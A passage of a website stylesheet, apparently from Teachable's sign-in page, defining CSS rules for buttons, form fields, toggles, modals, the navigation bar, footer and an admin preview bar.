  .btn-secondary, .btn-secondary:active, .btn-secondary:focus { font-size: 15px; }
}

.btn-secondary img, .btn-secondary:active img, .btn-secondary:focus img { margin-right: 10px; }

.btn-inverse, .btn-inverse:hover, .btn-inverse:active, .btn-inverse:focus { color: rgb(30, 166, 154); border-radius: 20px; background: rgb(255, 255, 255) !important; border: 1px solid rgb(189, 195, 199) !important; font-weight: 600 !important; outline: none !important; }

.btn-inverse:hover, .btn-inverse:hover:hover, .btn-inverse:active:hover, .btn-inverse:focus:hover { text-decoration: none; outline: none !important; color: rgb(26, 144, 134) !important; border: 1px solid rgb(175, 182, 187) !important; }

@media screen and (max-width: 767px) {
  .btn-inverse, .btn-inverse:hover, .btn-inverse:active, .btn-inverse:focus { font-size: 15px; }
}

.btn-inverse img, .btn-inverse:hover img, .btn-inverse:active img, .btn-inverse:focus img { margin-right: 10px; }

.btn-inverse[disabled], .btn-inverse[disabled]:hover, .btn-inverse[disabled]:active, .btn-inverse[disabled]:focus { opacity: 0.5; }

.btn-sm, .btn-sm:active, .btn-sm:focus { border-radius: 5px !important; padding: 0px 13px !important; font-weight: 400 !important; font-size: 13px !important; line-height: 26px !important; }

.btn-md, .btn-md:active, .btn-md:focus { display: inline-block; border-radius: 50px !important; font-size: 13px !important; padding: 16px 30px !important; }

.btn-hg, .btn-hg:active, .btn-hg:focus { display: inline-block; font-size: 17px !important; border-radius: 32px !important; padding: 12px 30px !important; }

.btn-white-border { background: none; border: 1px solid rgb(255, 255, 255); color: rgb(255, 255, 255); }

.btn-white-border:hover { background: rgb(255, 255, 255); border: 1px solid rgb(255, 255, 255); }

.btn-enroll { margin-bottom: 60px; }

.verify-card.profile { margin-top: 20px; }

.btn-teachable-block { min-width: 200px; }

.btn-orange, .btn-orange:hover, .btn-orange:active, .btn-orange:focus { border-color: rgb(255, 127, 69) !important; background-color: rgb(255, 127, 69) !important; }

.btn-orange:hover, .btn-orange:active, .btn-orange:focus, .btn-orange:hover:hover, .btn-orange:hover:active, .btn-orange:hover:focus, .btn-orange:active:hover, .btn-orange:active:active, .btn-orange:active:focus, .btn-orange:focus:hover, .btn-orange:focus:active, .btn-orange:focus:focus { border-color: rgb(255, 109, 44) !important; background-color: rgb(255, 109, 44) !important; }

.btn-orange[disabled], .btn-orange[disabled]:hover, .btn-orange[disabled]:active, .btn-orange[disabled]:focus { background-color: rgb(255, 127, 69) !important; }

.btn-teachable-inverse, .btn-teachable-inverse:hover, .btn-teachable-inverse:active, .btn-teachable-inverse:focus { color: rgb(9, 165, 154); border-radius: 20px; background: rgb(255, 255, 255) !important; border: 1px solid rgb(156, 212, 208) !important; font-weight: 600 !important; outline: none !important; }

.btn-teachable-inverse:hover, .btn-teachable-inverse:hover:hover, .btn-teachable-inverse:active:hover, .btn-teachable-inverse:focus:hover { text-decoration: none; outline: none !important; color: rgb(8, 141, 131) !important; border: 1px solid rgb(138, 204, 200) !important; }

@media screen and (max-width: 767px) {
  .btn-teachable-inverse, .btn-teachable-inverse:hover, .btn-teachable-inverse:active, .btn-teachable-inverse:focus { font-size: 15px; }
}

.btn-teachable-inverse img, .btn-teachable-inverse:hover img, .btn-teachable-inverse:active img, .btn-teachable-inverse:focus img { margin-right: 10px; }

.btn-teachable-inverse[disabled], .btn-teachable-inverse[disabled]:hover, .btn-teachable-inverse[disabled]:active, .btn-teachable-inverse[disabled]:focus { opacity: 0.5; }

.btn-teachable, .btn-teachable:hover, .btn-teachable:active, .btn-teachable:focus { margin: auto; color: rgb(255, 255, 255) !important; background-image: url("https://sso.teachable.com/secure/teachable_accounts/sign_in//assets.teachablecdn.com/icons/teachable-icon-white-rebrand.svg") !important; background-repeat: no-repeat !important; padding-left: 48px !important; background-size: 22px 22px !important; background-position: 11px 50% !important; }

.btn-teachable:hover, .btn-teachable:hover:hover, .btn-teachable:active:hover, .btn-teachable:focus:hover { background-image: url("https://sso.teachable.com/secure/teachable_accounts/sign_in//assets.teachablecdn.com/icons/teachable-icon-white-rebrand.svg") !important; background-position: 11px 50% !important; background-repeat: no-repeat !important; background-size: 22px 22px !important; }

@media screen and (max-width: 460px) {
  .btn-teachable, .btn-teachable:hover, .btn-teachable:active, .btn-teachable:focus { width: 100%; background-image: none !important; padding-left: 21px !important; }
}

.btn-block, .btn-block:hover, .btn-block:focus { display: block; }

.btn-inline-block { min-width: 300px; position: relative; }

.btn-price .price { border-left: 1px solid rgba(255, 255, 255, 0.5); color: rgba(255, 255, 255, 0.5); font-weight: normal; margin-left: 30px; padding: 16px 0px 16px 16px; }

.btn-price-description { font-size: 12px; margin-top: 10px; color: rgb(176, 176, 176); }

a.btn, a.btn:hover, a.btn:focus { display: inline-block; }

label.control-default { font-weight: 300; line-height: 27px; }

input.form-control { padding: 5px 10px; height: 40px; font-weight: 200; margin-bottom: 14px; transition: all 0.3s ease 0s; box-shadow: none; }

input.form-control:focus { border-color: rgb(75, 223, 210); outline: 0px; box-shadow: none; }

input.form-control::-webkit-input-placeholder { opacity: 0.7; }

input.form-control.search { font-size: 17px; height: 45px; padding-left: 18px; border-bottom-left-radius: 6px !important; border-top-left-radius: 6px !important; }

input.form-control.error { border-color: var(--red-herring); }

.inline-error { color: var(--red-herring); font-size: 14px; }

select.form-control { height: 40px; }

.form-group.field { margin-bottom: 0px; }

div.custom-radio { background: white; display: block; width: 16px; height: 16px; min-height: 16px; border-radius: 10px; border: 2px solid rgb(204, 204, 204); margin: auto; top: 10px; transition: all 0.1s linear 0s; position: relative; cursor: pointer; }

div.custom-radio .selected { background: white; display: block; width: 1px; height: 1px; top: 6px; left: 5px; position: absolute; border-radius: 10px; transition: all 0.1s linear 0s; }

.active div.custom-radio, .checked div.custom-radio { border: 2px solid rgb(30, 166, 154); }

.active div.custom-radio .selected, .checked div.custom-radio .selected { background: rgb(30, 166, 154); width: 8px; height: 8px; top: 2px; left: 2px; }

select.form-control { appearance: none; background: url("https://sso.teachable.com/secure/teachable_accounts/sign_in//assets.teachablecdn.com/icons/select-up-down.png") right 12px center / 15px no-repeat rgb(255, 255, 255); padding: 5px 15px; border: 1px solid rgb(204, 204, 204); box-shadow: none; margin-bottom: 14px; border-radius: 4px; }

select.form-control:focus { outline: 0px; box-shadow: none !important; border: 1px solid rgb(9, 165, 154) !important; }

.has-success .form-control { box-shadow: none; border-color: rgb(9, 165, 154) !important; }

.wistia_menu_item { padding: 8px; }

.open > .dropdown-menu { transform: scale(1, 1); }

.open > .dropdown-menu li a { color: rgb(0, 0, 0); }

.dropdown-menu li a { color: rgb(255, 255, 255); }

.dropdown-menu { transform-origin: center top; animation-fill-mode: forwards; transform: scale(1, 0); transition: all 0.2s ease-out 0s; }

@media screen and (-webkit-min-device-pixel-ratio: 0) {
  .dropdown-menu { display: none; }
}

.dropup .dropdown-menu { transform-origin: center bottom; }

.dropdown-menu.left-caret::before { position: absolute; top: -7px; left: 9px; display: inline-block; border-right: 7px solid transparent; border-bottom: 7px solid rgba(0, 0, 0, 0.2); border-left: 7px solid transparent; content: ""; }

.dropdown-menu.left-caret::after { position: absolute; top: -6px; left: 10px; display: inline-block; border-right: 6px solid transparent; border-bottom: 6px solid white; border-left: 6px solid transparent; content: ""; }

.dropdown-menu.left-caret::before, .dropdown-menu.pull-left::before { left: 17px; right: auto; }

.dropdown-menu.left-caret::after, .dropdown-menu.pull-left::after { left: 18px; right: auto; }

.modal-header { border-bottom: 0px; z-index: 1300 !important; }

.modal-header .close { color: rgb(255, 255, 255); opacity: 1; font-weight: 100; font-size: 40px; margin-right: 20px; margin-top: 20px; }

.modal-header .close:focus { outline: 0px !important; }

.modal-body { z-index: 1100 !important; }

.modal-backdrop.in { opacity: 0.8; }

.custom-toggle { position: absolute; margin-left: -9999px; opacity: 0; }

.custom-toggle + label { display: block; position: relative; cursor: pointer; outline: none; user-select: none; }

input.custom-toggle-round + label { padding: 2px; width: 35px; height: 18px; background-color: rgb(221, 221, 221); border-radius: 60px; }

input.custom-toggle-round + label::before, input.custom-toggle-round + label::after { display: block; position: absolute; top: 1px; left: 1px; bottom: 1px; content: ""; }

input.custom-toggle-round + label::before { right: 1px; background-color: rgb(241, 241, 241); border-radius: 30px; transition: background 0.2s ease-out 0s; }

input.custom-toggle-round + label::after { width: 17px; border-radius: 100%; box-shadow: rgba(0, 0, 0, 0.3) 0px 2px 5px; background-color: rgb(250, 250, 250); transition: margin 0.2s ease-out 0s; }

input.custom-toggle-round:checked + label::before { background-color: rgb(226, 252, 229); }

input.custom-toggle-round:checked + label::after { margin-left: 17px; background: rgb(140, 225, 150); border: 1px solid rgb(118, 205, 129); }

.switch-toggle a, .switch-light span span { display: none; }

@media only screen {
  .switch-toggle { display: block; height: 23px; position: relative; border-radius: 14px; margin-top: -1px; margin-bottom: 14px; padding: 0px !important; }
  .switch-toggle * { box-sizing: border-box; padding: 0px 10px 1px 9px; }
  .switch-toggle a { display: block; transition: all 0.2s ease-out 0s; }
  .switch-toggle label, .switch-toggle > span { line-height: 1.875em; vertical-align: middle; }
  .switch-toggle input:focus ~ a, .switch-toggle input:focus + label { outline: rgb(136, 136, 136) dotted 1px; }
  .switch-toggle input { position: absolute; opacity: 0; }
  .switch-toggle input + label { position: relative; z-index: 2; float: left; width: 50%; height: 100%; margin: 0px; text-align: center; font-weight: 200; font-size: 11px; cursor: pointer; color: var(--black); }
  .switch-toggle input:checked + label { outline: 0px; }
  .switch-toggle a { position: absolute; top: 0px; left: 0px; padding: 0px; z-index: 1; width: 50%; height: 100%; background: rgb(140, 225, 150); box-shadow: rgba(0, 0, 0, 0.3) 0px 2px 5px; border: 1px solid rgb(118, 205, 129); }
  .switch-toggle input:last-of-type:checked ~ a { left: 50%; }
  .switch-toggle.switch-3 label, .switch-toggle.switch-3 a { width: 33.3333%; }
  .switch-toggle.switch-3 input:checked:nth-of-type(2) ~ a { left: 33.3333%; }
  .switch-toggle.switch-3 input:checked:last-of-type ~ a { left: 66.6667%; }
  .switch-toggle.switch-4 label, .switch-toggle.switch-4 a { width: 25%; }
  .switch-toggle.switch-4 input:checked:nth-of-type(2) ~ a { left: 25%; }
  .switch-toggle.switch-4 input:checked:nth-of-type(3) ~ a { left: 50%; }
  .switch-toggle.switch-4 input:checked:last-of-type ~ a { left: 75%; }
  .switch-toggle.switch-5 label, .switch-toggle.switch-5 a { width: 20%; }
  .switch-toggle.switch-5 input:checked:nth-of-type(2) ~ a { left: 20%; }
  .switch-toggle.switch-5 input:checked:nth-of-type(3) ~ a { left: 40%; }
  .switch-toggle.switch-5 input:checked:nth-of-type(4) ~ a { left: 60%; }
  .switch-toggle.switch-5 input:checked:last-of-type ~ a { left: 80%; }
}

@media only screen and (-webkit-max-device-pixel-ratio: 2) and (max-device-width: 80em) {
  .switch-light, .switch-toggle { animation: 1s ease 0s infinite normal none running webkitSiblingBugfix; }
}

@-webkit-keyframes webkitSiblingBugfix { 
  0% { transform: translate3d(0px, 0px, 0px); }
  100% { transform: translate3d(0px, 0px, 0px); }
}

.table th, .table td { padding: 24px; }

.table th { line-height: 32px; }

.alert { font-weight: 600; }

.alert .gray-link { font-size: 12px; text-decoration: underline; color: rgb(149, 165, 166); }

.alert .help-block { color: inherit; margin-top: inherit; margin-right: inherit; margin-left: inherit; margin-bottom: 0px; }

.alert-info, .alert-info a { color: rgb(78, 154, 191); }

.alert-danger, .alert-danger a { color: rgb(165, 107, 106); }

.alert-success a { text-decoration: underline; color: rgb(60, 118, 61); }

.alert-default { border: 1px solid rgb(204, 204, 204); background: rgb(255, 255, 255); }

.alert-teachable { border: none; padding-left: 50px; color: rgb(255, 255, 255); font-weight: 600; background: url("https://sso.teachable.com/secure/teachable_accounts/sign_in//assets.teachablecdn.com/icons/teachable-icon-white-rebrand.svg") 14px 14px / 20px 20px no-repeat rgb(9, 165, 154) !important; }

.alert-teachable a, .alert-teachable a:hover { color: rgb(255, 255, 255); text-decoration: underline; }

.modal { text-align: center; }

.modal .modal-header .close { position: absolute; top: 0px; right: 0px; color: rgb(202, 218, 233); }

.modal .modal-dialog { display: inline-block; text-align: left; vertical-align: middle; }

.modal .modal-dialog.modal-md { width: 750px; }

.modal .modal-dialog.modal-lg { width: 1070px; }

@media screen and (max-width: 1070px) {
  .modal .modal-dialog.modal-lg { max-width: 90%; position: absolute; left: 3%; margin-left: 20px; margin-right: 24px; }
  .modal .modal-dialog.modal-lg .modal-footer { padding-top: 70px; }
  .modal .modal-dialog.modal-lg .modal-footer .pull-left { margin-top: 0px; width: 100%; text-align: center; padding-left: 30px; padding-right: 30px; }
}

@media screen and (max-width: 820px) {
  .modal .modal-dialog.modal-lg .modal-icon { display: none; }
  .modal .modal-dialog.modal-lg .modal-footer { padding-top: 20px; }
  .modal .modal-dialog.modal-lg .btn { margin-bottom: 20px; width: 100%; }
}

.modal .modal-dialog .modal-header, .modal .modal-dialog .modal-body { border: 0px; padding: 40px; }

.modal .modal-dialog .modal-subtitle { font-size: 0.95em; }

.modal .modal-dialog .modal-header { padding-top: 40px; padding-bottom: 22px; }

.modal .modal-dialog .modal-header .modal-title { font-weight: 600; font-size: 22px; color: rgb(43, 54, 54); padding-left: 10px; }

.modal .modal-dialog .modal-header .close { opacity: 1; font-weight: 100; font-size: 40px; margin-right: 30px; margin-top: 30px; }

.modal .modal-dialog .modal-icon { float: left; margin-right: 30px; margin-top: 35px; margin-left: 40px; width: 240px; height: 200px; background-repeat: no-repeat; }

.modal .modal-dialog .modal-icon.conversion-icon { background: url("https://sso.teachable.com/secure/teachable_accounts/sign_in//assets.teachablecdn.com/icons/icon-conversion.svg"); }

.modal .modal-dialog .modal-body { padding: 0px 50px 10px; }

.modal .modal-dialog .modal-body p { font-size: 13px; line-height: 25px; font-weight: 500; color: rgb(133, 146, 166); }

.modal .modal-dialog .modal-footer { background: none; border: 0px; padding-top: 5px; padding-bottom: 50px; }

.modal .modal-dialog .modal-footer .btn { margin-right: 10px; font-weight: 600; }

.modal.vertically-centered::before { display: inline-block; vertical-align: middle; content: " "; height: 100%; }

@media screen and (max-width: 767px) {
  .modal.vertically-centered::before { display: block; vertical-align: top; height: auto; }
  .modal .modal-dialog.modal-sm, .modal .modal-dialog.modal-md, .modal .modal-dialog.modal-lg { width: 96%; }
}

.confetti-mask { position: absolute; top: 0px; right: 0px; z-index: 2; background: linear-gradient(transparent, rgb(255, 255, 255)) left center repeat; pointer-events: none; opacity: 1; transition: opacity 2s ease-in 0s; }

.confetti-mask.fader { opacity: 0; }

.confetti-canvas { position: absolute; top: 0px; right: 0px; z-index: 1; pointer-events: none; opacity: 1; transition: opacity 4s ease-in 0s; }

.confetti-canvas.fader { opacity: 0; }

html { min-height: 100%; position: relative; font-size: 100%; }

body { overflow: auto; background: none; font-family: Proxima; color: var(--squid-ink); margin: 0px !important; }

a { color: rgb(30, 166, 154); }

a:hover, a:active { color: rgb(14, 80, 74); }

a, a:active, a:hover, a:focus { text-decoration: none; }

p { font-size: 18px; font-weight: 200; line-height: 28px; }

h3 { line-height: 33px; }

.bold { font-weight: 700 !important; }

.nav > li > a:focus { outline: 0px; background: none !important; }

.lecture-attachment h2, .post h2, .block.rich_text h2 { font-size: 26px; font-weight: 600; }

.lecture-attachment p, .post p, .block.rich_text p { font-size: 17px; font-weight: normal; line-height: 30px; margin-bottom: 22px; }

.lecture-attachment p.lecture-description, .post p.lecture-description, .block.rich_text p.lecture-description { margin-bottom: 17px; }

.lecture-attachment p:empty, .post p:empty, .block.rich_text p:empty { margin: 0px; }

.lecture-attachment p:empty::after, .post p:empty::after, .block.rich_text p:empty::after { clear: both; content: ""; display: table; }

.lecture-attachment ul li, .lecture-attachment ol li, .post ul li, .post ol li, .block.rich_text ul li, .block.rich_text ol li { font-size: 17px; font-weight: normal; line-height: 26px; margin-bottom: 15px; }

.lecture-attachment blockquote, .post blockquote, .block.rich_text blockquote { margin: 30px 0px; line-height: 33px; }

.lecture-attachment img, .post img, .block.rich_text img { max-width: 100%; }

.container-row { padding-top: 20px; padding-bottom: 20px; background-color: var(--clinical); }

.gray-layout { background: var(--fog); padding-bottom: 100px; }

.full-width-height-bg { height: 100vh; position: absolute; width: 100vw; top: 0px; }

.large-img-rounded { border-radius: 50%; margin: auto; }

.section-title { margin-bottom: 30px; font-size: 22px; font-weight: 600; }

.checkout-page { background-color: var(--clinical); }

.rebrand-2020 a { color: var(--obsidian); text-decoration: underline; }

.rebrand-2020 a:hover, .rebrand-2020 a:active { color: var(--plumette); text-decoration-color: var(--teachable-green); }

.rebrand-2020 a.isolate { text-decoration: none; border-bottom: 2px solid var(--obsidian); transition: all 0.3s ease 0s; }

.rebrand-2020 a.isolate:hover, .rebrand-2020 a.isolate:active { border-color: var(--teachable-green); }

.v1-header, .lecture-header { position: sticky; top: 0px; z-index: 101; }

.navbar-fedora { background-color: rgb(43, 54, 54); position: relative; margin-bottom: 0px; top: 0px; transition: none 0s ease 0s; }

.navbar-fedora .gravatar { width: 30px; height: 30px; border-radius: 15px; }

.navbar-fedora .navbar-current-user { display: none; }

.navbar-fedora .navbar-enrolled { display: none; }

.navbar-fedora .navbar-header { width: 100%; }

.navbar-fedora .navbar-brand { font-weight: normal; color: white; font-size: 30px; line-height: 30px; height: 60px; }

.navbar-fedora .navbar-brand.header-logo { max-width: 250px; padding-top: 0px; padding-bottom: 0px; display: flex; -webkit-box-align: center; align-items: center; }

.navbar-fedora .navbar-brand.header-logo img { height: auto; max-width: 100%; }

@media screen and (max-width: 767px) {
  .navbar-fedora .navbar-brand { font-size: 18px; }
}

.navbar-fedora .link-to-admin { width: 108px; }

.navbar-fedora .navbar-toggle { margin-top: 14px; color: white; }

.navbar-fedora .navbar-toggle .icon-bar { background: white !important; }

.navbar-fedora .navbar-collapse { box-shadow: none !important; max-height: none !important; }

.navbar-fedora .navbar-collapse.in, .navbar-fedora .navbar-collapse.collapsing { position: absolute; right: 0px; top: 48px; width: 100%; z-index: 300; background: rgb(43, 54, 54) !important; }

.navbar-fedora .navbar-collapse.in .nav.navbar-nav, .navbar-fedora .navbar-collapse.collapsing .nav.navbar-nav { margin: -0.5px -15px; }

.navbar-fedora .navbar-collapse.in .nav.navbar-nav > li .fedora-navbar-link, .navbar-fedora .navbar-collapse.collapsing .nav.navbar-nav > li .fedora-navbar-link { color: white !important; }

.navbar-fedora .navbar-collapse.in .nav.navbar-nav > li .fedora-navbar-link.active, .navbar-fedora .navbar-collapse.in .nav.navbar-nav > li .fedora-navbar-link:hover, .navbar-fedora .navbar-collapse.in .nav.navbar-nav > li .fedora-navbar-link:focus, .navbar-fedora .navbar-collapse.collapsing .nav.navbar-nav > li .fedora-navbar-link.active, .navbar-fedora .navbar-collapse.collapsing .nav.navbar-nav > li .fedora-navbar-link:hover, .navbar-fedora .navbar-collapse.collapsing .nav.navbar-nav > li .fedora-navbar-link:focus { background-color: rgb(32, 40, 40) !important; color: white !important; }

.navbar-fedora .navbar-collapse.in .nav.navbar-nav ul.dropdown-menu, .navbar-fedora .navbar-collapse.collapsing .nav.navbar-nav ul.dropdown-menu { margin: 0px; }

.navbar-fedora .navbar-collapse.in .nav.navbar-nav ul.dropdown-menu li a, .navbar-fedora .navbar-collapse.collapsing .nav.navbar-nav ul.dropdown-menu li a { color: rgb(255, 255, 255); margin-top: -3px; font-weight: 200; }

.navbar-fedora .navbar-collapse.in .nav.navbar-nav ul.dropdown-menu li a:hover, .navbar-fedora .navbar-collapse.collapsing .nav.navbar-nav ul.dropdown-menu li a:hover { background-color: rgb(20, 26, 26) !important; }

.nav .open > a, .nav .open > a:hover, .nav .open > a:focus { background: rgb(32, 40, 40) !important; }

.nav.navbar-nav > li > a { line-height: 30px; font-weight: 200; }

.nav.navbar-nav > li .fedora-navbar-link { font-size: 15px; cursor: pointer; color: white !important; }

.nav.navbar-nav > li .fedora-navbar-link.active, .nav.navbar-nav > li .fedora-navbar-link:hover, .nav.navbar-nav > li .fedora-navbar-link:focus { background-color: rgb(32, 40, 40) !important; color: white !important; }

.nav.navbar-nav > li .fedora-navbar-link:focus { outline: -webkit-focus-ring-color auto 5px; }

.nav.navbar-nav > li .btn-primary { font-size: 14px; margin-left: 10px; color: white; margin-top: 11px !important; }

.navbar-course-hero { background: none rgba(43, 54, 54, 0.97); border: 0px; }

.navbar-course-hero.is-at-top { border: 0px; }

.navbar-course-hero.is-at-top .navbar-brand, .navbar-course-hero.is-at-top a.fedora-navbar-link { color: white !important; }

.navbar-course-hero.is-at-top .navbar-brand:hover, .navbar-course-hero.is-at-top a.fedora-navbar-link:hover { background: none !important; color: rgb(204, 204, 204) !important; }

.navbar-course-hero.is-at-top .icon-bar { background: white !important; }

.is-above-the-fold.show-nav-background-color, .is-at-top.show-nav-background-color, .navbar-fedora.is-at-top.is-not-signed-in.show-nav-background-color { background: rgba(43, 54, 54, 0.97); }

.admin-header { bottom: 0px; z-index: 200; }

.admin-header .navbar-dark { background-color: rgba(34, 34, 34, 0.9); }

.logged-in-header { top: 0px; background-color: rgb(43, 54, 54); z-index: 100; }

.full-width { background-color: rgb(43, 54, 54); position: static; width: 100%; }

.full-width .nav-icon-back { width: 40px; font-size: 29px; padding: 20px 15px; cursor: pointer; color: rgb(238, 238, 238); line-height: 66px; vertical-align: middle; opacity: 0.9; }

.full-width .nav-icon-back:hover { opacity: 1; }

.full-width .nav-icon-back i { background: white; width: 40px; height: 40px; padding: 6px 0px 0px; text-align: center; font-size: 26px; border-radius: 25px; font-weight: 200; color: rgb(43, 54, 54); }

.full-width .nav-back-link { padding: 15px; cursor: pointer; color: white; }

.full-width .admin-header-content { color: var(--slate); }

.full-width .admin-nav-icon-back { height: 50px; padding: 10px; line-height: 20px; display: block; float: left; text-align: center; color: rgb(255, 255, 255); opacity: 1; width: 50px !important; }

.full-width .admin-nav-icon-back i { color: rgb(255, 255, 255); background: none; width: 25px; height: 25px; font-size: 20px; padding-top: 2px; }

.full-width .admin-nav-icon-back:hover { text-decoration: none; }

.full-width .navbar-fedora { width: 100%; border-radius: 0px; z-index: 200; min-height: 0px !important; }

.full-width .navbar-fedora .navbar-header-collapse { float: right; padding-right: 40px; }

.full-width .navbar-fedora .navbar-nav { width: 100%; margin: 0px !important; padding: 0px !important; }

.full-width .navbar-toggle { margin-top: 6px; margin-right: 15px; margin-bottom: 6px; }

.alert-header { background: rgb(227, 255, 227); text-align: center; padding: 10px; border-bottom: 1px solid rgb(219, 219, 219); font-size: 13px; line-height: 22px; display: none; margin-bottom: 0px; }

.alert-header .bolded { font-weight: bold; }

.alert-header a { text-decoration: underline; }

.alert-header .close { float: right; font-size: 17px; color: rgb(55, 71, 52); font-weight: 100; padding-top: 2px; }

.alert-header input { margin-left: 10px; display: inline-block; font-weight: normal; padding-left: 5px; margin-top: -2px; font-size: 14px; }

.alert-header .center-container { text-align: center; margin: auto; }

.alert-header .green, .alert-header .green a { color: rgb(120, 155, 113); }

@media screen and (max-width: 480px) {
  .full-width .navbar-fedora .navbar-collapse.in, .full-width .navbar-fedora .navbar-collapse.collapsing { top: 47px; }
  .navbar-fedora { min-height: 60px; }
  .navbar-fedora .navbar-collapse.in .nav.navbar-nav, .navbar-fedora .navbar-collapse.collapsing .nav.navbar-nav { margin: 0px; }
  .navbar-fedora .dropdown-menu { background-color: rgb(41, 46, 46); }
  .navbar-fedora .navbar-header-courses { position: absolute; height: 100%; }
  .navbar-fedora .navbar-current-user { display: inline-block; padding-left: 5px; }
  .navbar-fedora .navbar-enrolled { display: block; }
  .navbar-fedora .navbar-enrolled .sidebar-nav-link { color: white; }
  .navbar-fedora .navbar-enrolled .sidebar-nav { display: block; padding-left: 0px; margin: 0px; }
  .navbar-fedora .navbar-enrolled .lecture-sidebar-icon { display: none; }
}

@media screen and (min-width: 768px) {
  .alert-header { display: block; }
  .alert-wrapper { margin-top: 101px; }
}

@media screen and (max-width: 990px) {
  .navbar-collapse .btn-primary { text-align: left; width: 100%; background-color: transparent !important; padding: 15px 18px 15px 10px !important; border-radius: 0px !important; float: left !important; margin: 0px !important; border: 0px !important; }
  .navbar-collapse .btn-primary.active, .navbar-collapse .btn-primary:hover, .navbar-collapse .btn-primary:focus { background-color: rgb(32, 40, 40) !important; color: white !important; }
}

footer { bottom: 0px; width: 100%; background-color: rgb(43, 54, 54); position: absolute; color: rgb(186, 193, 199); padding: 39px 0px 42px; }

footer .footer-column { text-align: center; }

footer .navbar-brand { font-size: 24px; margin-top: -4px; padding: 0px; }

footer .title { font-size: 13px; font-weight: 700; margin-top: 0px; }

footer a { color: inherit; }

.active footer a, footer a:hover, footer a:focus { color: rgb(30, 166, 154); }

footer .label, footer .badge { vertical-align: middle; }

footer .bottom-links { font-size: 14px; line-height: 1.286; }

footer .bottom-links::before, footer .bottom-links::after, footer .bottom-icons::before, footer .bottom-icons::after { content: " "; display: table; }

footer .bottom-links::after, footer .bottom-icons::after { clear: both; }

footer li.divider { height: 15px; }

footer a { color: rgb(186, 193, 199); }

footer a:hover, footer a:focus { color: white; text-decoration: none; }

footer a:hover .powered-by-logo, footer a:focus .powered-by-logo { opacity: 1; }

footer .powered-by { font-size: 16px; }

footer .powered-by .powered-by-logo { width: 79px; height: 17.3px; vertical-align: -3px; margin-left: 2px; opacity: 0.7; }

.you-div { margin-top: -20px; padding-top: 55px; padding-bottom: 105px; }

.you-div .container { margin-top: 30px; }

.btn-lg.discover-courses { font-size: 20px; }

@media screen and (max-width: 767px) {
  .footer-column { margin-bottom: 20px; }
}

.dsp-flex-xs { display: flex; }

.flex-align-items-center-xs { -webkit-box-align: center; align-items: center; }

.flex-justify-content-space-between-xs { -webkit-box-pack: justify; justify-content: space-between; }

.m-r-3-xs { margin-right: 16px; }

.p-h-3-xs { padding-left: 16px; padding-right: 16px; }

.p-v-2-xs { padding-top: 8px; padding-bottom: 8px; }

.preview-bar { position: relative; font-family: -apple-system, BlinkMacSystemFont, "San Francisco", "Segoe UI", Roboto, "Helvetica Neue", sans-serif; }

.preview-bar.full-width { background-color: rgba(34, 34, 34, 0.9); height: 60px; width: 100%; }

.preview-bar.admin-header { z-index: 2000; }

.preview-bar.admin-header .preview-navbar-dark { background-color: rgba(34, 34, 34, 0.9); }

.preview-bar .preview-navbar-header { float: none; width: 100%; }

.preview-bar .link-to-admin { display: flex; height: 60px; }

.preview-bar .admin-header-text, .preview-bar .admin-header-text > p { display: none; color: rgb(176, 176, 176); font-size: 14px; font-weight: 400; line-height: 20px; }

@media screen and (min-width: 992px) {
  .preview-bar .admin-header-text, .preview-bar .admin-header-text > p { display: block; }
}

.preview-bar .admin-header-text { margin-top: 20px; margin-left: 20px; }

.preview-bar li.admin-header-text { margin-left: 0px; }

.preview-bar .preview-navbar-nav { margin: 0px -15px; list-style: none; padding-left: 0px; }

.preview-bar .nav.preview-navbar-nav > li > a { font-weight: 600; }

.preview-bar .nav.preview-navbar-nav > li .fedora-navbar-link { font-size: 14px; color: rgb(255, 255, 255); line-height: 20px; padding-right: 30px; padding-left: 24px; padding-bottom: 14px; display: flex; -webkit-box-align: center; align-items: center; transition: background-color 0.3s ease 0s; padding-top: 16px !important; }

.preview-bar .nav.preview-navbar-nav > li .fedora-navbar-link:hover { color: rgb(255, 255, 255); background-color: rgb(8, 8, 8) !important; }

.preview-bar .nav.preview-navbar-nav > li .fedora-navbar-link .admin-nav-icon-back { height: 15px; padding: 0px; margin: -1px 16px 0px; display: block; width: 9px !important; }

.preview-bar .nav.preview-navbar-nav > li .fedora-navbar-link .admin-nav-icon-back::before { width: 50px; display: inline-block; }

.preview-bar .preview-navbar-nav > li > ul.dropdown-menu { background-color: rgb(255, 255, 255); position: absolute; top: 48px; left: 0px; right: 0px; border: 1px solid rgba(0, 0, 0, 0.05); box-shadow: rgba(0, 0, 0, 0.05) 0px 2px 4px; }

.preview-bar .preview-navbar-nav > li > ul.dropdown-menu li { color: rgb(51, 51, 51); }

.preview-bar .preview-navbar-nav > li > ul.dropdown-menu li a { padding: 3px 11px; }

.preview-bar .nav .open > a, .preview-bar .nav .open > a:hover, .preview-bar .nav .open > a:focus { outline: none; border-color: rgb(176, 176, 176); box-shadow: rgb(176, 176, 176) 0px 0px 3px; background-color: rgb(73, 73, 73) !important; }

.preview-bar .open > .dropdown-menu li a { color: rgb(51, 51, 51); }

.preview-bar .preview-navbar-nav > li.dropdown.preview-selector { display: flex; -webkit-box-align: center; align-items: center; margin: 0px 16px; }

.preview-bar .preview-navbar-nav > li.dropdown.preview-selector a.dropdown-toggle, .preview-bar .preview-navbar-nav > li.dropdown.preview-selector button.dropdown-toggle { font-family: -apple-system, BlinkMacSystemFont, "San Francisco", "Segoe UI", Roboto, "Helvetica Neue", sans-serif; font-size: 14px; font-weight: 600; color: rgb(255, 255, 255); cursor: pointer; line-height: 21px; background-color: rgb(73, 73, 73); border-radius: 4px; padding: 5px 12px !important; }

.preview-bar .preview-navbar-nav > li.dropdown.preview-selector a.dropdown-toggle:hover, .preview-bar .preview-navbar-nav > li.dropdown.preview-selector a.dropdown-toggle:focus, .preview-bar .preview-navbar-nav > li.dropdown.preview-selector button.dropdown-toggle:hover, .preview-bar .preview-navbar-nav > li.dropdown.preview-selector button.dropdown-toggle:focus { color: rgb(255, 255, 255); background-color: rgb(73, 73, 73) !important; }

.preview-bar .preview-navbar-nav > li.dropdown.preview-selector a.dropdown-toggle i.caret, .preview-bar .preview-navbar-nav > li.dropdown.preview-selector button.dropdown-toggle i.caret { border-top: 4px solid rgb(255, 255, 255); margin-left: 8px; }

.preview-bar .v2-dropdown { display: flex; position: relative; }

.preview-bar .v2-dropdown button.menu-trigger { margin: 0px; }

.preview-bar .v2-dropdown button.menu-trigger i.caret { margin-top: 4px; }

